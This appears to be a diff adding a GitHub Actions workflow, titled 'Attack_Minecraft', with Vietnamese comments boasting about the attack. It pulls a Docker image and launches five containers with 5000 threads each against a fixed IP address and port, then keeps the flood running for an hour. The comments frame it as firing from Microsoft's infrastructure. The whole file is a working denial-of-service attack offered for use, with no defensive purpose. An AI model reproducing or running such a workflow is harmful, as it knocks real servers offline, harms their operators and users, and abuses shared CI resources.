@@ -1,0 +1,20 @@
+name: Attack_Minecraft
+on: workflow_dispatch
+
+jobs:
+  launch_attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pull Vũ Khí
+        run: docker pull minhtudz/dd-at:latest
+
+      - name: Khai Hỏa 🚀
+        run: |
+          # Chạy 5 máy ảo cùng lúc để "vả" rát nhất có thể
+          docker run -d -e TARGET_IP=172.65.204.41 -e PORT=1377 -e THREADS=5000 minhtudz/dd-at:latest
+          docker run -d -e TARGET_IP=172.65.204.41 -e PORT=1377 -e THREADS=5000 minhtudz/dd-at:latest
+          docker run -d -e TARGET_IP=172.65.204.41 -e PORT=1377 -e THREADS=5000 minhtudz/dd-at:latest
+          docker run -d -e TARGET_IP=172.65.204.41 -e PORT=1377 -e THREADS=5000 minhtudz/dd-at:latest
+          docker run -d -e TARGET_IP=172.65.204.41 -e PORT=1377 -e THREADS=5000 minhtudz/dd-at:latest
+          echo "Đạn đang bay từ hạ tầng Microsoft!"
+          sleep 3600 # Duy trì đòn đánh trong 1 tiếng
